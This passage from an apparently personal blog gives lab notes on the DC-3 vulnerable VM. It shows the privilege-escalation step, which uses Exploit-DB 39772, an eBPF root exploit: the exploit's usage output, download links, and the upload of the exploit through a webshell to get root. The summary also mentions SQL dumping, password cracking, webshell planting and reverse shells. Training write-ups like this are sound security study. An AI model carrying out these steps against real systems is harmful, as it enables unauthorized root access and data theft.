https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<p>前面一大堆是在讲原理，我们关注下面这块：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<p>可以看到最后一行为EXP下载地址，下载下来：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201931.png"></p>
<p>下载失败了，尝试了网上各种解决该问题方法也无果</p>
<p>最后从别人网盘下载到了这个exp压缩包</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201935.png"></p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1LDzUYmpMKQEr7LCWlmxVHw">https://pan.baidu.com/s/1LDzUYmpMKQEr7LCWlmxVHw</a><br>提取码：luc8</p>
<p>下载下来后用蚁剑上传到靶机/tmp下，因为该目录肯定有写入权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201939.png"></p>
<p>看一下上传成功没</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201945.png"></p>
<p>nice！接下来根据39772.txt里面的usage进行提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<p>首先解压压缩包</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201951.png"></p>
<p>进入39772，解压exploit.tar</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201954.png"></p>
<p>看到了usage里面提到的ebpf_mapfd_doubleput</p>
<p>cd进去</p>
<p>然后跟着usage里面的步骤做就可以了</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816202001.png"></p>
<p>提权成功，获取flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816202005.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>学习使用了joomscan扫描网站</li>
<li>复习了sqlmap的素质六连脱库</li>
<li>学习使用了john爆破加密密码</li>
<li>学习使用模板模块来给服务器写入一句话木马</li>
<li>反弹shell的新姿势</li>
<li>学习了searchsploit中txt文件的使用方法以及英语阅读能力</li>
<li>学习了wget来下载文件</li>
</ol>
<p><strong>总体思路：信息收集–查找exp–登陆后台–上传webshell–反弹shell–提权</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rpsate/article/details/119682569?spm=1001.2014.3001.5501">https://blog.csdn.net/rpsate/article/details/119682569?spm=1001.2014.3001.5501</a></p>
<p><a target="_blank" rel="noopener" href="https://gcdcx.blog.csdn.net/article/details/106281151">https://gcdcx.blog.csdn.net/article/details/106281151</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">XUPT_w</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xunyang1.github.io/2021/08/16/dc3/">https://xunyang1.github.io/2021/08/16/dc3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">此文章版权归本人所有，如有转载，请註明来自原作者</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a><a class="post-meta__tags" href="/tags/DC/">DC</a></div><div class="post_share"><div class="social-share" data-image="https://c-ssl.duitang.com/uploads/item/201801/24/20180124181910_neveu.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/16/%E5%8F%8D%E5%BC%B9shell/"><img class="prev-cover" src="https://c-ssl.duitang.com/uploads/item/202002/21/20200221222930_hcsui.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">反弹shell命令总结</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/14/DC-2/"><img class="next-cover" src="https://c-ssl.duitang.com/uploads/item/201907/14/20190714195255_fsgcn.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC-2靶机笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/14/DC-2/" title="DC-2靶机笔记"><img class="cover" src="https://c-ssl.duitang.com/uploads/item/201907/14/20190714195255_fsgcn.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-14</div><div class="title">DC-2靶机笔记</div></div></a></div><div><a href="/2021/07/19/CSRF(跨站请求伪造)/" title="DVWA之CSRF漏洞复现"><img class="cover" src="http://n.sinaimg.cn/spider2020412/749/w480h269/20200412/8e2c-isehnni4820986.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-19</div><div class="title">DVWA之CSRF漏洞复现</div></div></a></div><div><a href="/2021/07/30/SQLi-Labs靶场总结/" title="SQLi-Labs靶场总结"><img class="cover" src="https://image.3001.net/images/20190406/1554546324_5ca87e94e2723.jpg!small" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-30</div><div class="title">SQLi-Labs靶场总结</div></div></a></div><div><a href="/2021/07/14/dvwa_sql/" title="DVWA之sql注入漏洞复现"><img class="cover" src="https://ae01.alicdn.com/kf/Hf5b6c774f0f44f1a9074cbd9be6038849.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-14</div><div class="title">DVWA之sql注入漏洞复现</div></div></a></div><div><a href="/2021/07/15/dvwa_xss/" title="DVWA之XSS漏洞复现"><img class="cover" src="https://img2.baidu.com/it/u=415799737,2456046709&fm=26&fmt=auto&gp=0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-15</div><div class="title">DVWA之XSS漏洞复现</div></div></a></div><div><a href="/2021/08/08/php反序列化/" title="PHP反序列化漏洞"><img class="cover" src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808234302.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-08</div><div class="title">PHP反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">XUPT_w</div><div class="author-info__description">just do it! ୧(⁎˃ ◡˂⁎)୨</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xunyang1/xunyang1.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xunyang1/xunyang1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=911365337&amp;site=qq&amp;menu=yes" target="_blank" title=""><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来的我的博客，请各位大佬指正୧((〃•̀ꇴ•〃))૭⁺✧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">1.</span> <span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.1.</span> <span class="toc-text">nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%B1%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">脱库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-number">1.3.</span> <span class="toc-text">登陆后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.4.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/16/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell命令总结"><img src="https://c-ssl.duitang.com/uploads/item/202002/21/20200221222930_hcsui.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell命令总结"/></a><div class="content"><a class="title" href="/2021/08/16/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell命令总结">反弹shell命令总结</a><time datetime="2021-08-16T04:41:22.014Z" title="发表于 2021-08-16 12:41:22">2021-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/16/dc3/" title="DC-3靶机笔记"><img src="https://c-ssl.duitang.com/uploads/item/201801/24/20180124181910_neveu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机笔记"/></a><div class="content"><a class="title" href="/2021/08/16/dc3/" title="DC-3靶机笔记">DC-3靶机笔记</a><time datetime="2021-08-16T03:58:28.584Z" title="发表于 2021-08-16 11:58:28">2021-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/14/DC-2/" title="DC-2靶机笔记"><img src="https://c-ssl.duitang.com/uploads/item/201907/14/20190714195255_fsgcn.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-2靶机笔记"/></a><div class="content"><a class="title" href="/2021/08/14/DC-2/" title="DC-2靶机笔记">DC-2靶机笔记</a><time datetime="2021-08-14T06:06:28.379Z" title="发表于 2021-08-14 14:06:28">2021-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化漏洞"><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808234302.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化漏洞"/></a><div class="content"><a class="title" href="/2021/08/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化漏洞">PHP反序列化漏洞</a><time datetime="2021-08-08T15:44:57.886Z" title="发表于 2021-08-08 23:44:57">2021-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/xss-lab/" title="xss-lab通关笔记"><img src="https://img.99danji.com/uploadfile/2019/1202/20191202111906167.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xss-lab通关笔记"/></a><div class="content"><a class="title" href="/2021/08/03/xss-lab/" title="xss-lab通关笔记">xss-lab通关笔记</a><time datetime="2021-08-03T03:46:21.719Z" title="发表于 2021-08-03 11:46:21">2021-08-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By XUPT_w</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://xunyang1.github.io/">Blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><script src="/gitcalendar/js/gitcalendar.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>